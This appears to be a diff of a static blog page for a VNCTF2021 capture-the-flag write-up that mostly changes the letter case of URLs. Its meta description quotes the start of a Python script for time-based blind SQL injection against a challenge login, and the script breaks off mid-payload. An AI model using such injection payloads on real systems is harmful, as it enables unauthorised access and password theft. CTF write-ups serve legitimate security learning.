@@ -12,7 +12,7 @@ tql
 realezjvav[复现] 第一关是一个笛卡尔积注入，其实当时fuzz出来之后发现sleep benchmark RLIKE get_lock都被ban了，只剩笛卡尔积了，奈何还是太菜了，一直没办法延时，最后又跑去想是不是别的方向。。。
 自己写的脚本：（本来想用三个table的组合，会延时1s左右，但是不知道为啥有时候正常的请求会有5s的延时，所以改用两个table加一个column，这样大概会有13秒左右的延时，然后时差&amp;gt;10s即可；time.sleep(0.1)是怕buu的容器429Too Many Requests）
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  import requests import time url = &amp;#34;http://0ce14b29-a69c-47eb-9aa1-2c0c972e4125.node3.buuoj.cn/user/login&amp;#34; ans = &amp;#34;&amp;#34; for i in range(1, 100): flag = 1 for j in range(31,127): # password：no_0ne_kn0w_th1s payload = &amp;#34;1&amp;#39; and if(ascii(substr(password,&amp;#34;+ str(i) +&amp;#34;,1))&amp;gt;&amp;#34;+ str(j) +&amp;#34;,0,(SELECT count(*) FROM information_schema."><title>VNCTF2021</title>
-<link rel=canonical href=https://k1te.cn/2021/03/14/vnctf/>
+<link rel=canonical href=https://k1te.cn/2021/03/14/VNCTF/>
 <link rel=stylesheet href=/scss/style.min.445f140069a334e0a849a507486c823ccc053246a20296cb62e77ff22191eb8b.css><meta property="og:title" content="VNCTF2021">
 <meta property="og:description" content="Ezgame 在网上找到这个游戏的源码，然后在game.js中搜索win关键词，发现当winTimer.IsSet()返回True时，游戏胜利。
 然后在其他文件里找找，就可以在gameEngine.js中找到Timer类的isSet方法：
@@ -26,7 +26,7 @@ tql
 realezjvav[复现] 第一关是一个笛卡尔积注入，其实当时fuzz出来之后发现sleep benchmark RLIKE get_lock都被ban了，只剩笛卡尔积了，奈何还是太菜了，一直没办法延时，最后又跑去想是不是别的方向。。。
 自己写的脚本：（本来想用三个table的组合，会延时1s左右，但是不知道为啥有时候正常的请求会有5s的延时，所以改用两个table加一个column，这样大概会有13秒左右的延时，然后时差&amp;gt;10s即可；time.sleep(0.1)是怕buu的容器429Too Many Requests）
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  import requests import time url = &amp;#34;http://0ce14b29-a69c-47eb-9aa1-2c0c972e4125.node3.buuoj.cn/user/login&amp;#34; ans = &amp;#34;&amp;#34; for i in range(1, 100): flag = 1 for j in range(31,127): # password：no_0ne_kn0w_th1s payload = &amp;#34;1&amp;#39; and if(ascii(substr(password,&amp;#34;+ str(i) +&amp;#34;,1))&amp;gt;&amp;#34;+ str(j) +&amp;#34;,0,(SELECT count(*) FROM information_schema.">
-<meta property="og:url" content="https://k1te.cn/2021/03/14/vnctf/">
+<meta property="og:url" content="https://k1te.cn/2021/03/14/VNCTF/">
 <meta property="og:site_name" content="k1te's blog">
 <meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="wp"><meta property="article:tag" content="ctf"><meta property="article:published_time" content="2021-03-14T01:47:24+08:00"><meta property="article:modified_time" content="2021-03-14T01:47:24+08:00">
 <meta name=twitter:title content="VNCTF2021">
@@ -64,7 +64,7 @@ extended">
 </a>
 </header>
 <h2 class=article-title>
-<a href=/2021/03/14/vnctf/>VNCTF2021</a>
+<a href=/2021/03/14/VNCTF/>VNCTF2021</a>
 </h2>
 <footer class=article-time>
 <div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
@@ -213,28 +213,28 @@ extended">
 </a>
 </article>
 <article>
-<a href=/2021/08/03/dasjuly/>
+<a href=/2021/08/03/DasJuly/>
 <div class=article-details>
 <h2 class=article-title>DasJuly X CBCTF 4th 部分wp</h2>
 </div>
 </a>
 </article>
 <article>
-<a href=/2021/07/26/cybrics2021/>
+<a href=/2021/07/26/cyBrics2021/>
 <div class=article-details>
 <h2 class=article-title>CyBRICS2021</h2>
 </div>
 </a>
 </article>
 <article>
-<a href=/2021/01/24/djbctf2021/>
+<a href=/2021/01/24/DJBCTF2021/>
 <div class=article-details>
 <h2 class=article-title>2021大吉大利杯</h2>
 </div>
 </a>
 </article>
 <article>
-<a href=/2020/09/28/bjdctf2020/>
+<a href=/2020/09/28/BJDCTF2020/>
 <div class=article-details>
 <h2 class=article-title>BJDCTF2020</h2>
 </div>
